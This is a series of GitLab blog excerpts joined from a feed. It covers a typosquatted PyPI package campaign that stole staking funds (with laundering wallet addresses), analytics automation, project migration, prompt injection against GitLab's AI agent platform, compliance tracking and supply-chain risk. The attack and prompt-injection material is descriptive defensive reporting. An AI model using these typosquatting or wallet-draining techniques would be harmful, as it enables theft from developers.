who stake typically hold substantial cryptocurrency holdings, making them lucrative victims.</li>\n<li><strong>Required wallet access:</strong> Staking operations require users to unlock their wallets and provide authentication—giving the malicious code exactly what it needs to drain funds.</li>\n<li><strong>Expected network activity:</strong> Since staking naturally involves blockchain transactions, the additional malicious transfer doesn't immediately raise suspicions.</li>\n<li><strong>Routine operations:</strong> Experienced users stake regularly, creating familiarity that breeds complacency and reduces scrutiny.</li>\n<li><strong>Delayed detection:</strong> Users might initially assume any balance changes are normal staking fees or temporary holds, delaying discovery of the theft.</li>\n</ol>\n<p>By hiding malicious code within legitimate-looking staking functionality, the attackers exploited both the technical requirements and user psychology of routine blockchain operations.</p>\n<h2>Following the money</h2>\n<p>GitLab's Vulnerability Research team traced the cryptocurrency flows to understand the full scope of this operation. The primary destination wallet <code>5FjgkuPzAQHax3hXsSkNtue8E7moEYjTgrDDGxBvCzxc1nqR</code> served as a central collection point before funds were distributed through a network of intermediary wallets.</p>\n<h3>The money laundering network</h3>\n<p>Our analysis revealed a multi-hop laundering scheme:</p>\n<ol>\n<li><strong>Primary collection:</strong> Stolen funds initially arrive at <code>5FjgkuPzAQHax3hXsSkNtue8E7moEYjTgrDDGxBvCzxc1nqR</code></li>\n<li><strong>Distribution network:</strong> Funds are quickly moved to intermediate wallets including:\n<ul>\n<li><code>5HpsyxZKvCvLEdLTkWRM4d7nHPnXcbm4ayAsJoaVVW2TLVP1</code></li>\n<li><code>5GiqMKy1kAXN6j9kCuog59VjoJXUL2GnVSsmCRyHkggvhqNC</code></li>\n<li><code>5ER5ojwWNF79k5wvsJhcgvWmHkhKfW5tCFzDpj1Wi4oUhPs6</code></li>\n<li><code>5CquBemBzAXx9GtW94qeHgPya8dgvngYXZmYTWqnpea5nsiL</code></li>\n</ul>\n</li>\n<li><strong>Final consolidation:</strong> All paths eventually converge at <code>5D6BH6ai79EVN51orsf9LG3k1HXxoEhPaZGeKBT5oDwnd2Bu</code></li>\n<li><strong>Cash-out endpoint:</strong> Final destination appears to be <code>5HDo9i9XynX44DFjeoabFqPF3XXmFCkJASC7FxWpbqv6D7QQ</code></li>\n</ol>\n<h2>The typosquatting strategy</h2>\n<p>The attackers employed a typosquatting strategy that exploits common typing errors and package naming conventions:</p>\n<ul>\n<li><strong>Missing characters:</strong> <code>bitensor</code> instead of <code>bittensor</code> (missing 't')</li>\n<li><strong>Truncation:</strong> <code>bittenso</code> instead of <code>bittensor</code> (missing final 'r')</li>\n<li><strong>Version mimicking:</strong> All packages used version numbers (<code>9.9.4</code>, <code>9.9.5</code>) that closely match legitimate package versions</li>\n</ul>\n<p>This approach maximizes the chance of installation through developer typos during <code>pip install</code> commands and copy-paste errors from documentation.</p>\n<h2>Looking ahead: The future of supply chain security</h2>\n<p>GitLab continues to invest in proactive security research to identify and neutralize threats before they impact our community. Our automated detection system works around the clock to protect the software supply chain that powers modern development.</p>\n<p>The swift detection and analysis of this attack demonstrate the value of proactive security measures in combating sophisticated threats.

The solution includes comprehensive Python scripts that can be easily customized and scheduled.</p>\n<p><strong>GitLab CI/CD integration</strong></p>\n<p>For enterprise-scale automation, integrate these Python scripts into scheduled GitLab <a href=\"https://about.gitlab.com/topics/ci-cd/\">CI/CD</a> pipelines. This approach leverages your existing GitLab infrastructure while ensuring consistent, reliable data collection:</p>\n<pre><code class=\"language-yaml\">\n# .gitlab-ci.yml example\n\nduo_analytics_collection:\n  stage: analytics\n  script:\n    - python scripts/enhanced_duo_data_collection.py\n    - python scripts/metric_aggregations.py\n    - ./deploy_dashboard_updates.sh\n  schedule:\n    - cron: &quot;0 2 1 * *&quot;  # Monthly on 1st at 2 AM\n  only:\n    - schedules\n</code></pre>\n<p>This automation strategy transforms manual data collection into a self-sustaining analytics engine. Your Python scripts execute monthly via GitLab pipelines, automatically collecting usage data, calculating ROI metrics, and updating dashboards — all without manual intervention.</p>\n<p>Once automated, the solution operates seamlessly: Scheduled pipelines execute Python data collection scripts, process GraphQL responses into business metrics, and update dashboard data stores. You can watch as the dashboard populates with real usage patterns: code suggestion volumes by programming language, user adoption trends across teams, and license utilization rates that reveal optimization opportunities.</p>\n<p>The real value emerges when you access the ROI Overview dashboard. Here, you'll see concrete enagagement metrics metrics which can be converted into business impact for your organisation — perhaps discovering that your active Duo users are generating 127% monthly ROI through time savings and productivity gains, while 23% of your licenses remain underutilized. These insights immediately translate into actionable recommendations: expand licenses to high-performing teams, implement targeted training for underutilized users, and build data-driven business cases for broader AI adoption.</p>\n<h2>Why GitLab?</h2>\n<p>GitLab's comprehensive DevSecOps platform provides the ideal baseline for enterprise AI analytics and measurement.

Thanks to resource batching and concurrent execution of import and export processes the chance of interruption or timeout is significantly lowered.</li>\n<li>It offers better insights into the migration while it runs as well as after it completes. In the UI you can observe as the numbers grow as more items are imported. Then you can <a href=\"https://docs.gitlab.com/user/group/import/direct_transfer_migrations/#review-results-of-the-import\">review the results</a>. You can see that an item was imported thanks to an <code>Imported</code> badge on items in the GitLab UI.</li>\n</ul>\n<p>We’ve come a long way since GitLab 14.3 when we started supporting the direct migration of the group resources. In GitLab 15.8, we <a href=\"https://about.gitlab.com/blog/2023/01/18/try-out-new-way-to-migrate-projects/\">extended this functionality to projects as a beta</a>. Since then, we have worked to improve the efficiency and reliability of importing, especially for large projects. We thoroughly reviewed the feature from a security and instance stability standpoint.</p>\n<p>To give an example of the sizes of the groups and projects we've tested with, and their import duration, we've seen successful imports of:</p>\n<ul>\n<li>100 projects (19.9k issues, 83k merge requests, 100k+ pipelines) that migrated in 8 hours</li>\n<li>1,926 projects (22k issues, 160k merge requests, 1.1 million pipelines) that migrated in 34 hours</li>\n</ul>\n<p>On GitLab.com, migrating by direct transfer is enabled by default. On GitLab Self-Managed and on GitLab Dedicated, an administrator must <a href=\"https://docs.gitlab.com/ee/administration/settings/import_and_export_settings.html#enable-migration-of-groups-and-projects-by-direct-transfer\">enable the feature in application settings</a>.</p>\n<h2>When to use migrating by direct transfer and how to get the best results</h2>\n<p>Migrating by direct transfer requires network connection between instances or GitLab.com. Therefore, customers that use air-gapped networks with no connectivity between their GitLab instances still have to use file exports to copy their GitLab data. They will be able to use migrating groups and projects by direct transfer after we extend this solution to also <a href=\"https://gitlab.com/groups/gitlab-org/-/epics/8985\">support offline instances</a>.</p>\n<p>Before you attempt a migration, review <a href=\"https://docs.gitlab.com/user/group/import/\">documentation</a>, including <a href=\"https://docs.gitlab.com/user/group/import/direct_transfer_migrations/#prerequisites\">prerequisites</a>, <a href=\"https://docs.gitlab.com/ee/user/group/import/#migrated-group-items\">group items</a>, and <a href=\"https://docs.gitlab.com/ee/user/group/import/#migrated-project-items\">project items</a> that are migrated. Some items are excluded from migration or not yet supported.</p>\n<h3>Migrate between most recent possible versions</h3>\n<p>We recommend migrating between versions that are as recent as possible. Update the source and destination instances to take advantage of all improvements and bug fixes we’ve added over time.</p>\n<h3>Prepare for user contribution mapping post migration</h3>\n<p>Familiarize yourself with <a href=\"https://docs.gitlab.com/user/project/import/#user-contribution-and-membership-mapping\">user contribution and membership mapping process</a> so you know what to expect after migration completes and what are the next steps for you to take.</p>\n<h3>Review options to reduce migration duration</h3>\n<p>Depending on where you’re migrating to, GitLab.com, a self-managed instance, or Dedicated, you can employ <a href=\"https://docs.gitlab.com/ee/user/group/import/#reducing-migration-duration\">various strategies to reduce the migration duration</a>.</p>\n<h2>How can I review the results?</h2>\n<p>You can view all groups and projects migrated by you by direct transfer listed on the <a href=\"https://docs.gitlab.com/user/group/import/direct_transfer_migrations/#group-import-history\">group import history page</a>. For each group and project, you can view statistics for imported items and dig down into details in case some items were not imported. Alternatively, you can use <a href=\"https://docs.gitlab.com/ee/api/bulk_imports.html#list-all-group-or-project-migrations-entities\">API endpoints</a> to do the same.</p>\n<p>In cases where most of your projects completed successfully but one or two end up missing some relations, like merge requests or issues, we recommend that you try re-importing those projects <a href=\"https://docs.gitlab.com/ee/api/bulk_imports.html#start-a-new-group-or-project-migration\">by using the API</a>.</p>\n<p><img alt=\"\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1753961409/ja8agmwarwxxlo9vmqbo.gif\" /></p>\n<h2>What’s next for migrating by direct transfer?</h2>\n<p>We are excited to bring migration by direct transfer to general availability and hope you are too!

      "summary": "<p>As GitLab's Senior Director of Application Security, my primary mission is straightforward: to protect our customers from harm caused by software vulnerabilities. In an era where AI is transforming how we build software, this mission has taken on new dimensions and urgency. Here’s how we're working with the global security research community to make <a href=\"https://docs.gitlab.com/user/duo_agent_platform/\">GitLab Duo Agent Platform</a> secure against emerging threats.</p>\n<h2>The AI security challenge</h2>\n<p>AI-powered platforms create incredible productivity for engineers. However, the ability to create code also brings a crucial need for robust security. For example, prompt injection attacks embed hidden instructions in comments, source code, and merge request descriptions. These can guide AI into making attacker-controlled recommendations to the user or, in some cases, autonomously taking unintended action. Addressing these risks helps ensure the responsible and secure evolution of AI in development.</p>\n<p>GitLab’s security and engineering teams work diligently to provide customers with a safe and secure platform. Partnerships with external security researchers, such as <a href=\"https://www.persistent-security.net/post/part-i-prompt-injection-exploiting-llm-instruction-confusion\">Persistent Security</a>, are an integral part of that approach.</p>\n<h2>Our commitment to transparent collaboration</h2>\n<p><a href=\"https://about.gitlab.com/ai-transparency-center/\">GitLab's AI Transparency Center</a> details how we uphold ethics and transparency in our development and use of AI-powered features. This commitment extends to our collaboration with security researchers.</p>\n<p>When Persistent Security reached out to GitLab to discuss a complex prompt injection issue with industry-wide impact, they were quickly connected to the GitLab Product Security Response Team to investigate if any of our products were affected.</p>\n<p>Through this dialogue, we were able to quickly identify and implement mitigations that were deployed prior to the public beta of GitLab Duo Agent Platform in July 2025. This rapid response exemplifies our approach to working with security researchers and collaborating transparently throughout the process to coordinate remediation and disclosure to protect customers.</p>\n<h2>Why external research matters for AI security</h2>\n<p>AI systems present unique security challenges that require diverse perspectives and specialized expertise.</p>\n<p>External researchers are essential for:</p>\n<ul>\n<li><strong>Rapid Threat Evolution:</strong> AI security threats evolve quickly. The research community helps us stay ahead of emerging attack patterns, from prompt injection techniques to novel ways of manipulating AI responses.</li>\n<li><strong>Real-World Testing:</strong> External researchers test our systems in ways that mirror actual attacker behavior, providing invaluable insights into how our defenses perform under pressure.</li>\n<li><strong>Diverse Expertise:</strong> External security researchers often demonstrate exceptional creativity, with reports standing out for innovative approaches to identifying complex vulnerabilities. This diversity of thinking strengthens our overall security posture.</li>\n</ul>\n<h2>Our ongoing commitment</h2>\n<p>The security research community remains a crucial partner in our mission to protect customers. We're committed to:</p>\n<ul>\n<li>Providing clear guidance to researchers about our AI systems and security boundaries</li>\n<li>Maintaining rapid response times for security disclosures</li>\n<li>Sharing our learnings with the broader community through public disclosure and research</li>\n</ul>\n<p>The future of AI security depends on collaboration between organizations like GitLab and the security research community. By working together, we can ensure that AI remains a force for productivity and innovation while protecting our customers and users from harm.</p>\n<p>To our security research partners: thank you for your partnership, making us stronger, more secure, and better prepared for the challenges ahead. I’ll be at Black Hat August 6-7, 2025, and look forward to connecting with AI security researchers there.

      "published": "2025-07-24T00:00:00.000Z",
      "summary": "<p>An observation is a compliance finding or deficiency identified during control monitoring. This is essentially a gap between what your security controls should be doing and what they're actually doing. Observations can stem from design deficiencies where the control isn't structured properly to meet requirements, operating effectiveness issues where the control exists but isn't working as intended, or evidence gaps where required documentation or proof of control execution is missing.</p>\n<p>These observations emerge from our quarterly control monitoring process, where we systematically assess the effectiveness of security controls supporting our certifications (SOC 2, ISO 27001, etc.). Observations can also be the output of our external audits from third-party assessors. Observations aren't just compliance checkboxes, they represent real security risks that need prompt, visible remediation.</p>\n<p>Observation management is the process by which we manage these observations from identification through remediation to closure. In this article, you'll learn how the GitLab Security Team uses the DevSecOps platform to manage and remediate observations, and the efficiencies we've realized from doing so.</p>\n<h2>The GitLab observation lifecycle: From identification to resolution</h2>\n<p>The lifecycle of an observation encompasses the entire process from initial identification by compliance engineers through to completed remediation by remediation owners. This lifecycle enables real-time transparent status reporting and that is easier for all stakeholders to understand and follow.</p>\n<p>Here are the stages of the observation lifecycle:</p>\n<p><strong>1. Identification</strong></p>\n<ul>\n<li>Compliance engineers identify potential observations during quarterly monitoring.</li>\n<li>Initial validation occurs to confirm the finding represents a genuine control gap.</li>\n<li>Detailed documentation begins immediately in a GitLab issue.</li>\n<li>The root cause of the observation is determined and a remediation plan to address the root cause is established.</li>\n</ul>\n<p><strong>2. Validation</strong></p>\n<ul>\n<li>Issue is assigned to the appropriate remediation owner (usually a team lead or department manager).</li>\n<li>Remediation owner reviews and confirms they understand and accept ownership.</li>\n<li>The remediation plan is reviewed, prioritized, and updated collaboratively as needed.</li>\n</ul>\n<p><strong>3. In-progress</strong></p>\n<ul>\n<li>Active remediation work begins with clear milestones and deadlines.</li>\n<li>Regular updates are provided through GitLab comments and status changes.</li>\n<li>Collaboration happens transparently where all stakeholders can see progress.</li>\n</ul>\n<p><strong>4. Remediated</strong></p>\n<ul>\n<li>Remediation owner marks work complete and provides evidence.</li>\n<li>Issue transitions to compliance review for validation.</li>\n</ul>\n<p><strong>5. Resolution</strong></p>\n<ul>\n<li>Compliance engineer verifies exit criteria are met.</li>\n<li>The issue is closed with final documentation.</li>\n<li>Lessons learned are captured for future prevention.</li>\n</ul>\n<p><strong>Alternative paths</strong> handle blocked work, risk acceptance decisions, and stalled remediation efforts with appropriate escalation workflows.\n<img alt=\"Example of observation lifecycle\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1753301753/pbvheikwpivuvhzd5ith.png\" />\n&lt;center&gt;&lt;i&gt;Example of observation lifecycle&lt;/i&gt;&lt;/center&gt;</p>\n<h2>The power of transparency in GitLab</h2>\n<p>Effective observation management shouldn't require detective work to determine basic information like ownership, status, or priority. Yet most organizations find themselves exactly in this scenario: compliance teams chasing updates, operational teams unaware of their responsibilities, and leadership lacking visibility into real risk exposure until audit season arrives.</p>\n<p>The Security Compliance team at GitLab faced these exact problems. Our team initially used a dedicated GRC tool as the single source of truth for outstanding observations, but the lack of visibility to key stakeholders meant minimal remediation actually occurred. The team found themselves spending their time on administrative work, rather than guiding remediation efforts.</p>\n<p>Our solution was to move observation management directly into GitLab issues within a dedicated project. This approach transforms observations from compliance issues into visible, actionable work items that integrate naturally into development and operations workflows. Every stakeholder can see what needs attention, collaborate on remediation plans, and track progress in real time, creating the transparency and accountability that traditional tools simply can't deliver.</p>\n<h3>Smart organization through labels and issue boards</h3>\n<p>GitLab allows teams to categorize observation issues into multiple organizational views. The Security Compliance team uses the following to categorize observations:</p>\n<ul>\n<li><strong>Workflow:</strong> <code>~workflow::identified</code>, <code>~workflow::validated</code>, <code>~workflow::in progress</code>, <code>~workflow::remediated</code></li>\n<li><strong>Department:</strong> <code>~dept::engineering</code>, <code>~dept::security</code>, <code>~dept::product</code></li>\n<li><strong>Risk Severity:</strong> <code>~risk::critical</code>, <code>~risk::high</code>, <code>~risk::medium</code>, <code>~risk::low</code></li>\n<li><strong>System:</strong> <code>~system::gitlab</code>, <code>~system::gcp</code>, <code>~system::hr-systems</code></li>\n<li><strong>Program:</strong> <code>~program::soc2</code>, <code>~program::iso</code>, <code>~program::fedramp</code> , <code>~program::pci</code></li>\n</ul>\n<p>These labels are then leveraged to create issue boards:</p>\n<ul>\n<li><strong>Workflow boards</strong> visualize the observation lifecycle stages.</li>\n<li><strong>Department boards</strong> show each team's remediation workload.</li>\n<li><strong>Risk-based boards</strong> prioritize critical findings requiring immediate attention.</li>\n<li><strong>System boards</strong> visualize observations by system.</li>\n<li><strong>Program boards</strong> track certification-specific observation resolution.</li>\n</ul>\n<p>Labels enable powerful filtering and reporting while supporting automated workflows through our triage bot policies. Please refer to the automation section for more details on our automation strategy.</p>\n<h2>Automation: Working smarter, not harder</h2>\n<p>Managing dozens of observations across multiple certifications requires smart automation. The Security Compliance team utilizes the <a href=\"https://gitlab.com/gitlab-org/ruby/gems/gitlab-triage\">triage bot</a>, which is an open source project hosted in GitLab. The triage bot gem aims to enable project managers to automatically triage issues in GitLab projects or groups based on defined policies. This helps manage issue hygiene so stakeholders can focus their efforts on remediation.</p>\n<p>Within the observation management project, we have policies written to ensure there is an assignee on each issue, each issue has required labels, issues are updated every 30 days, and blocked and stalled issues are nudged every 90 days. In addition, a weekly summary issue is created to summarize all the issues out of compliance based on our defined policies. This enables team members to monitor issues efficiently and spend less time on administrative tasks.</p>\n<h2>Measuring success: Key metrics and reporting</h2>\n<p>GitLab's raw issue data can be leveraged into actionable intelligence. Organizations can extract meaningful insights from issue creation date, closed date, last updated date, and labels. The following metrics provide a comprehensive view of your observation management effectiveness:</p>\n<p><strong>Resolution Efficiency Analysis:</strong> Average time from identification to resolution by department and severity</p>\n<p>Track issue creation versus close dates across departments and severity levels to identify bottlenecks and measure performance against SLAs. This reveals which teams excel at rapid response and which may need additional resources or process improvements.</p>\n<p><strong>Real-Time Risk Assessment:</strong> Current risk profile based on open critical and high risk observations</p>\n<p>Leverage risk level labels to create dynamic visualizations of your organization's current risk exposure. This provides leadership with an immediate understanding of critical observations requiring urgent attention.</p>\n<p><strong>Strategic Resource Allocation:</strong> Department-level risk distribution for targeted improvement efforts</p>\n<p>Identify which departments are responsible for remediation of the highest-risk observations to prioritize resources, oversight, and projects. This data-driven approach ensures improvement efforts focus where they'll have maximum impact.</p>\n<p><strong>Compliance Readiness Monitoring:</strong> Certification-specific observation counts and resolution rates</p>\n<p>Utilize certification labels to assess audit preparedness and track progress toward compliance goals. This metric provides early warning of potential certification risks and validates remediation efforts.</p>\n<p><strong>Accountability Tracking:</strong> Overdue remediations</p>\n<p>Monitor SLA compliance to ensure observations receive timely attention. This metric highlights systemic delays and enables proactive intervention before minor issues become major problems.</p>\n<p><strong>Engagement Health Check:</strong> Observation freshness</p>\n<p>Track recent activity (updates within 30 days) to ensure observations remain actively managed rather than forgotten. This metric identifies stagnant issues that may require escalation or reassignment.</p>\n<h2>Advanced strategies: Taking observation management further</h2>\n<p>Here's what you can do to deepen the impact of observation management in your organization.</p>\n<p><strong>Integrate with security tools</strong></p>\n<p>Modern observation management extends beyond manual tracking by connecting with your existing security infrastructure. Organizations can configure vulnerability scanners and security monitoring tools to automatically generate observation issues, eliminating manual data entry and ensuring comprehensive coverage.</p>\n<p><strong>Apply predictive analytics</strong></p>\n<p>Historical observation data becomes a powerful forecasting tool when properly analyzed. Organizations can leverage past remediation patterns to predict future timelines and resource requirements, enabling more accurate project planning and budget allocation. Pattern recognition in observation types reveals systemic vulnerabilities that warrant preventive controls, shifting focus from reactive to proactive risk management. Advanced implementations incorporate multiple data sources into sophisticated risk scoring algorithms that provide nuanced threat assessments and priority rankings.</p>\n<p><strong>Customize for stakeholders</strong></p>\n<p>Effective observation management recognizes that different roles require different perspectives on the same data. Role-based dashboards deliver tailored views for executives seeking high-level risk summaries, department managers tracking team performance, and individual contributors managing their assigned observations. Automated reporting systems can be configured to match various audience needs and communication preferences, from detailed technical reports to executive briefings. Self-service analytics capabilities empower stakeholders to conduct ad-hoc analysis and generate custom insights without requiring technical expertise or support.</p>\n<h2>Move from mere compliance to operational excellence</h2>\n<p>GitLab's approach to observation management represents more than a tool change, it's a fundamental shift from reactive compliance to proactive risk mitigation. By breaking down silos between compliance teams and operational stakeholders, organizations achieve unprecedented visibility while dramatically improving remediation outcomes.</p>\n<p>The results are measurable: faster resolution through transparent accountability, active stakeholder collaboration instead of reluctant participation, and continuous audit readiness rather than periodic scrambles. Automated workflows free compliance professionals for strategic work while rich data enables predictive analytics that shift focus from reactive firefighting to proactive prevention.</p>\n<p>Most importantly, this approach elevates compliance from burden to strategic enabler. When observations become visible, trackable work items integrated into operational workflows, organizations develop stronger security culture and lasting improvements that extend beyond any single audit cycle. The outcome isn't just regulatory compliance. It's organizational resilience and competitive advantage through superior risk management.</p>\n<blockquote>\n<p>Want to learn more about GitLab's security compliance practices?

      "summary": "<p>Ask most development teams about supply chain security, and you'll get answers focused on vulnerability scanning or dependency management. While these are components of supply chain security, they represent a dangerously narrow view of a much broader challenge.</p>\n<p><strong>Supply chain security isn't just about scanning dependencies.</strong> It encompasses the entire journey from code creation to production deployment, including:</p>\n<ul>\n<li><strong>Source security:</strong> protect code repositories, managing contributor access, ensuring code integrity</li>\n<li><strong>Build security:</strong> secure build environments, preventing tampering during compilation and packaging</li>\n<li><strong>Artifact security:</strong> ensure the integrity of containers, packages, and deployment artifacts</li>\n<li><strong>Deployment security:</strong> secure the delivery mechanisms and runtime environments</li>\n<li><strong>Tool security:</strong> harden the development tools and platforms themselves</li>\n</ul>\n<p>The &quot;chain&quot; in supply chain security refers to this interconnected series of steps. A weakness anywhere in the chain can compromise the entire software delivery process.</p>\n<p>The <a href=\"https://www.cisa.gov/news-events/news/joint-statement-federal-bureau-investigation-fbi-cybersecurity-and-infrastructure-security\">2020 SolarWinds attack</a> illustrates this perfectly. In what became one of the largest supply chain attacks in history, state-sponsored attackers compromised the build pipeline of SolarWinds' Orion network management software. Rather than exploiting a vulnerable dependency or hacking the final application, they injected malicious code during the compilation process itself.</p>\n<p>The result was devastating: More than 18,000 organizations, including multiple U.S. government agencies, unknowingly installed backdoored software through normal software updates. The source code was clean, the final application appeared legitimate, but the build process had been weaponized. This attack remained undetected for months, demonstrating how supply chain vulnerabilities can bypass traditional security measures.</p>\n<h3>Common misconceptions that leave organizations vulnerable</h3>\n<p>Despite growing awareness of supply chain threats, many organizations remain exposed because they operate under fundamental misunderstandings about what software supply chain security actually entails. These misconceptions create dangerous blind spots:</p>\n<ul>\n<li>Thinking software supply chain security equals dependency scanning</li>\n<li>Focusing only on open source components while ignoring proprietary code risks</li>\n<li>Believing that code signing alone provides sufficient protection</li>\n<li>Assuming that secure coding practices eliminate supply chain risks</li>\n<li>Treating it as a security team problem rather than a development workflow challenge</li>\n</ul>\n<p><img alt=\"Software supply chain security dependency chart\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1753200077/kqndvlxyvncshdiq0xea.png\" /></p>\n<h2>How AI is changing the game</h2>\n<p>Just as organizations are grappling with traditional software supply chain security challenges, artificial intelligence (AI)  is introducing entirely new attack vectors and amplifying existing ones in unprecedented ways.</p>\n<h3>AI-powered attacks: More sophisticated, more scalable</h3>\n<p>Attackers are using AI to automate vulnerability discovery, generate convincing social engineering attacks targeting developers, and systematically analyze public codebases for weaknesses. What once required manual effort can now be done at scale — with precision.</p>\n<h3>The AI development supply chain introduces new risks</h3>\n<p>AI is reshaping the entire development lifecycle, but it's also introducing significant security blind spots:</p>\n<ul>\n<li><strong>Model supply chain attacks:</strong> Pre-trained models from sources like Hugging Face or GitHub may contain backdoors or poisoned training data.</li>\n<li><strong>Insecure AI-generated code:</strong> Developers using AI coding assistants may unknowingly introduce vulnerable patterns or unsafe dependencies.</li>\n<li><strong>Compromised AI toolchains:</strong> The infrastructure used to train, deploy, and manage AI models creates a new attack surface.</li>\n<li><strong>Automated reconnaissance:</strong> AI enables attackers to scan entire ecosystems to identify high-impact supply chain targets.</li>\n<li><strong>Shadow AI and unsanctioned tools:</strong> Developers may integrate external AI tools that haven't been vetted.</li>\n</ul>\n<p>The result? AI doesn't just introduce new vulnerabilities, it amplifies the scale and impact of existing ones. Organizations can no longer rely on incremental improvements. The threat landscape is evolving faster than current security practices can adapt.</p>\n<p><img alt=\"AI amplification effect\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1753200139/xuxezxld6ztlvjocgjlx.png\" /></p>\n<h2>Why most organizations still struggle</h2>\n<p>Even organizations that understand supply chain security often fail to act effectively. The statistics reveal a troubling pattern of awareness without corresponding behavior change.</p>\n<p>When <a href=\"https://www.cnn.com/2021/05/19/politics/colonial-pipeline-ransom/index.html\">Colonial Pipeline paid hackers $4.4 million</a> in 2021 to restore operations, or when 18,000 organizations fell victim to the SolarWinds attack, the message was clear: Supply chain vulnerabilities can bring down critical infrastructure and compromise sensitive data at unprecedented scale.</p>\n<p>Yet, despite this awareness, most organizations continue with business as usual. The real question isn't whether organizations care about supply chain security — it's why caring alone isn't translating into effective protection.</p>\n<p>The answer lies in four critical barriers that prevent effective action:</p>\n<p><strong>1. The false economy mindset</strong></p>\n<p>Organizations sometimes focus on the cost instead of &quot;what's the most effective approach?&quot; This cost-first thinking creates expensive downstream problems.</p>\n<p><strong>2. Skills shortage reality</strong></p>\n<p>With <a href=\"https://codific.com/bsimm-building-security-in-maturity-model-a-complete-guide/\">organizations averaging 4 security professionals per 100 developers</a>, according to BSIMM research, and <a href=\"https://www.isc2.org/Insights/2024/09/Employers-Must-Act-Cybersecurity-Workforce-Growth-Stalls-as-Skills-Gaps-Widen\">90% of organizations reporting critical cybersecurity skills gaps</a>, according to ISC2, traditional approaches are mathematically impossible to scale.</p>\n<p><strong>3. Misaligned organizational incentives</strong></p>\n<p>Developer OKRs focus on feature velocity while security teams measure different outcomes. When C-suite priorities emphasize speed-to-market over security posture, friction becomes inevitable.</p>\n<p><strong>4. Tool complexity overload</strong></p>\n<p>The <a href=\"https://www.gartner.com/en/newsroom/press-releases/2025-03-03-gartner-identifiesthe-top-cybersecurity-trends-for-2025\">average enterprise uses 45 cybersecurity tools</a>, with <a href=\"https://www.ponemon.org/news-updates/blog/security/new-ponemon-study-on-malware-detection-prevention-released.html\">40% of security alerts being false positives</a> and must <a href=\"https://newsroom.ibm.com/2020-06-30-IBM-Study-Security-Response-Planning-on-the-Rise-But-Containing-Attacks-Remains-an-Issue\">coordinate across 19 tools on average for each incident</a>.</p>\n<p>These barriers create a vicious cycle: Organizations recognize the threat, invest in security solutions, but implement them in ways that don't drive the desired outcomes.</p>\n<h2>The true price of supply chain insecurity</h2>\n<p>Supply chain attacks create risk and expenses that extend far beyond initial remediation. Understanding these hidden multipliers helps explain why prevention is not just preferable – it's essential for business continuity.</p>\n<p><strong>Time becomes the enemy</strong></p>\n<ul>\n<li>Average time to identify and contain a supply chain breach: <a href=\"https://keepnetlabs.com/blog/171-cyber-security-statistics-2024-s-updated-trends-and-data\">277 days</a></li>\n<li>Customer trust rebuilding period: <a href=\"https://www.bcg.com/publications/2024/rebuilding-corporate-trust\">2-3+ years</a></li>\n<li>Engineering hours diverted from product development to security remediation</li>\n</ul>\n<p><strong>Reputation damage compounds</strong></p>\n<p>When attackers compromise your supply chain, they don't just steal data – they undermine the foundation of customer trust. <a href=\"https://www.metacompliance.com/blog/data-breaches/5-damaging-consequences-of-a-data-breach\">Customer churn rates typically increase 33% post-breach</a>, while partner relationships require costly re-certification processes. Competitive positioning suffers as prospects choose alternatives perceived as &quot;safer.&quot;</p>\n<p><strong>Regulatory reality bites</strong></p>\n<p>The regulatory landscape has fundamentally shifted. <a href=\"https://www.skillcast.com/blog/20-biggest-gdpr-fines\">GDPR fines now average over $50 million for significant data breache</a>s. The EU's new <a href=\"https://about.gitlab.com/blog/gitlab-supports-banks-in-navigating-regulatory-challenges/#european-cyber-resilience-act-(cra)\">Cyber Resilience Act</a> mandates supply chain transparency. U.S. federal contractors must provide software bills of materials (<a href=\"https://about.gitlab.com/blog/the-ultimate-guide-to-sboms/\">SBOMs</a>) for all software purchases — a requirement that's rapidly spreading to private sector procurement.</p>\n<p><strong>Operational disruption multiplies</strong></p>\n<p>Beyond the direct costs, supply chain attacks create operational chaos such as platform downtime during attack remediation, emergency security audits across entire technology stacks, and legal costs from customer lawsuits and regulatory investigations.</p>\n<h2>What's wrong with current approaches</h2>\n<p>Most organizations confuse security activity with security impact. They deploy scanners, generate lengthy reports, and chase teams to address through manual follow-ups. But these efforts often backfire — creating more problems than they solve.</p>\n<h3>Massive scanning vs. effective protection</h3>\n<p>Enterprises generate over <a href=\"https://www.securityweek.com/enterprises-generate-10000-security-events-day-average-report/\">10,000 security alerts each month, with the most active generating roughly 150,000 events per day.</a> <a href=\"https://panther.com/blog/identifying-and-mitigating-false-positive-alerts\">But 63%</a> of these are false positives or low-priority noise. Security teams become overwhelmed and turn into bottlenecks instead of enablers.</p>\n<h3>The collaboration breakdown</h3>\n<p>The most secure organizations don't have the most tools; they have the strongest DevSecOps collaboration. But most current setups make this harder by splitting workflows across incompatible tools, failing to show developers security results in their environment, and offering no shared visibility into risk and business impact.</p>\n<h2>The path forward</h2>\n<p>Understanding these challenges is the first step toward building effective supply chain security. The organizations that succeed don't just add more security tools, they fundamentally rethink how security integrates with development workflows. They also review end-to-end software delivery workflows to simplify processes, reduce tools and improve collaboration.</p>\n<p>At GitLab, we've seen how integrated DevSecOps platforms can address these challenges by bringing security directly into the development workflow. In our next article in this series, we'll explore how leading organizations are transforming their approach to supply chain security through developer-native solutions, AI-powered automation, and platforms that make security a natural part of building great software.</p>\n<blockquote>\n<p>Learn more about <a href=\"https://about.gitlab.com/solutions/supply-chain/\">GitLab's software supply chain security capabilities</a>.</p>\n</blockquote>",

Starting that day, MongoDB users can now assign the following roles to database users: <strong>“readOnly”</strong>, <strong>“readWrite”</strong>, and <strong>“dbAdmin”</strong>. These predefined roles help simplify access management by allowing you to enforce clear, predefined access policies, applicable to actions such as querying data, performing CRUD operations, or managing database settings. Managing team access can be complex, time-consuming, and challenging. However, Role-Based Access Control helps address these issues by enhancing security, improving operational efficiency and compliance, reducing costs, and offering flexible role adaptability.

